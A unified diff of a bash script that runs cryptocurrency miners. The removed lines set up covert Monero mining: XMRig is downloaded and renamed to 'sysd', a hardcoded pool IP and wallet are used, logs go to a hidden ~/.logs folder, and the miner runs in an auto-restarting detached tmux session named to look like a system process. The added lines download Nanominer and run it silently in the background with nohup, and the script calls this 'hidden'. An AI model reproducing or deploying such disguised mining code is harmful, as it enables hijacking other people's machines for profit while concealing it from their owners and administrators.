@@ -1,50 +1,39 @@
 #!/bin/bash
-# ===============================
-# Monero CPU Mining - Hidden Mode
-# ===============================
 
-SESSION_NAME="sysd"  # اسم tmux مخفي
-XMRIG_VERSION="6.21.2"
-WORKER="100"
-POOL="45.155.102.89:443"
-WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"
-THREADS=  # عدد النوى
+# Parse arguments
+while [[ "$#" -gt 0 ]]; do
+    case $1 in
+        --wallet) wallet="$2"; shift ;;
+        --coin) coin="$2"; shift ;;
+        --pool) pool="$2"; shift ;;
+        --email) email="$2"; shift ;;
+    esac
+    shift
+done
 
-# مجلد السجلات
-LOG_DIR="$HOME/.logs"
-mkdir -p "$LOG_DIR"
-LOG_FILE="$LOG_DIR/sys.log"
-
-# 1. Download XMRig if not exists
-if [ ! -f xmrig-${XMRIG_VERSION}/xmrig ]; then
-    wget -q https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz
-    tar -xvf xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz >/dev/null
-    mv xmrig-${XMRIG_VERSION}/xmrig xmrig-${XMRIG_VERSION}/sysd   # إعادة تسمية الملف التنفيذي
+if [ -z "$wallet" ] || [ -z "$coin" ] || [ -z "$pool" ]; then
+    echo "Usage: $0 --wallet YOUR_WALLET --coin XMR --pool pool:port [--email youremail]"
+    exit 1
 fi
 
-# 2. Create auto-restart script
-cat > xmrig-${XMRIG_VERSION}/start.sh << EOF
-#!/bin/bash
-cd "\$(dirname "\$0")"
-while true
-do
-  ./sysd \\
-    -o ${POOL} \\
-    -u ${WALLET} \\
-    -p x \\
-    --tls \\
-    --threads=${THREADS} \\
-    --cpu-priority=5 >> "${LOG_FILE}" 2>&1
-  
-done
-EOF
-chmod +x xmrig-${XMRIG_VERSION}/start.sh
+# Download Nanominer if not present
+if [ ! -d "nanominer-linux" ]; then
+    echo "[+] Downloading Nanominer..."
+    wget -q https://github.com/nanopool/nanominer/releases/download/v3.10.0/nanominer-linux-3.10.0.tar.gz
+    tar -xvf nanominer-linux-3.10.0.tar.gz
+    cd nanominer-linux || exit 1
+else
+    cd nanominer-linux || exit 1
+fi
 
-# 3. Kill old session if exists
-# tmux kill-session -t ${SESSION_NAME} 2>/dev/null
+# Create config.ini
+cat <<EOL > config.ini
+wallet=$wallet
+coin=$coin
+pool=$pool
+email=$email
+EOL
 
-# 4. Start hidden tmux session
-tmux new -d -s ${SESSION_NAME} "cd xmrig-${XMRIG_VERSION} && ./start.sh"
-
-echo "[OK] Mining started in hidden tmux session: ${SESSION_NAME}"
-echo "[INFO] Log file: ${LOG_FILE}"
+# Run Nanominer silently in background
+nohup ./nanominer > /dev/null 2>&1 &
+echo "[+] Nanominer started in background (hidden)."
